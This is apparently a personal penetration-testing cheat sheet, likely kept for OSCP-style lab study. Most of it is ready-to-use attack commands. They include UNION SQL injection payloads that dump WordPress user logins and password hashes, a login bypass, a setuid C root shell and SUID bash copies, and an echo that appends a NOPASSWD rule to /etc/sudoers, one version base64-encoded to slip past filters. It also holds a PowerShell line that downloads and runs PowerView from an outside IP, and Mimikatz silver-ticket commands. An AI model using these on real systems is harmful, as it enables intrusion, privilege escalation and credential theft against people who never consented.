### tar unzip
```
tar -xvf filename
```
### start bloodhound
on mac terminal
```
conda deactivate
cd ~/oscp
./start-neo4j.sh
```
```
open bloodhound
```
#### to find certain files
```
find / -name *.ovpn 2>/dev/null
```
2>1 means redirect standard err to standard out
### sql injection (mysql)
#### union based
enum tables
```
OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,table_name,11 FROM information_schema.tables#"];
```
table to target: wp_users
enum columns
```
OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,column_name,11 FROM information_schema.columns WHERE table_name='wp_users'#"];
```
columns to target: user_login , user_pass
dump data
```
OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,concat(user_login,'~',user_pass),11 FROM wp_users#"];
```
### sql injection login bypass
targeting username:
```
admin'-- - (means backend sql will only validate username without looking at password)
```
e.g. original:
```
select user,pass from users where user = 'admin' and password = 'pwd';
```
injected:
```
select user,pass from users where user = 'admin'-- -' and password = 'pwd';
```
### wordpress shell plugins
```
/usr/share/seclists/Web-Shells/WordPress
```

### nslookup
```
nslookup
>server: 10.10.10.x
>10.10.10.x -- to check for the dns info
```

### c setuid shell
```
// gcc -o /tmp/rootshell /tmp/rootshell.c
// chmod u+s /tmp/rootshell
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
setuid(0); setgid(0); system("/bin/bash");
}
```
### add user to sudoers
```
echo 'reader ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
```
workaround with base64 - use cyberchef
![[Screenshot 2021-12-19 at 8.50.59 PM.png]]
```
echo "cmVhZGVyIEFMTD0oQUxMKSBOT1BBU1NXRDpBTEw=" | base64 -d >> /etc/sudoers
```
check:
```
sudo -l
```
To get a stable python shell
```
python -c 'import pty;pty.spawn("/bin/bash")';

```

Find file:
```
find / -name xxx.php
```
### copy bash and make suid (root priv)
find bash location
```
which bash
```
copy out bash + set suid 
```
cp /usr/bin/bash /tmp/mybash
chmod +s /tmp/mybash
```
activate the bash with suid
```
/tmp/mybash -p
```
oneliner
```
cp /bin/bash /tmp/mybash; chmod +s /tmp/mybash
```
### attack nfs
```
showmount -e
```
### set environment variables
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

### SSH Brute force using metasploit

https://charlesreid1.com/wiki/Metasploitable/SSH/Exploits
### windows creating users
```
net user john password /add

to add to domain (need domain admin. or genericAll on the domain)

net user john password /add /domain
```
### windows adding users to local groups
```
add to local group

net localgroup administrators john /add

to check

net localgroup administrators 
```
### windows adding users to domain groups
```
add to domain group

net group "EXCAHNGE WINDOWS PERMISSSIONS" john /add /domain

to check

net group "EXCAHNGE WINDOWS PERMISSSIONS" /domain
```
### find SPNs
```
Get-domainuser -SPN |select name,serviceprincipalname

name   serviceprincipalname
----   --------------------
krbtgt kadmin/changepw
```
### kerberos silver ticket attack (aka pass the ticket)
-> requirements: Hash of target service account, SID of target domain
-> to find domain SID -> load powerview
```
powershell
```
```
iex(new-object net.webclient).downloadstring('http://192.168.49.79/view.txt')
```
-> now load mimikatz to pass the ticket (silver ticket attack)
```
c:\windows\tasks\m.exe "privilege::debug"
```
```
kerberos::golden /user:offsec /domain:TARGET_DOMAIN /sid:TARGET_DOMAIN_SID /target:TARGET_URL /service:TARGET_SERVICE /rc4:TARGET_SERVICE_ACCOUNT_HASH /ptt
```
```
kerberos::golden /user:offsec /domain:corp1.com /sid:S-1-5-21-3746766531-1610887775-1523133702 /target:CorpWebServer.com /service:HTTPS /rc4:IISSVC_HASH /ptt
```
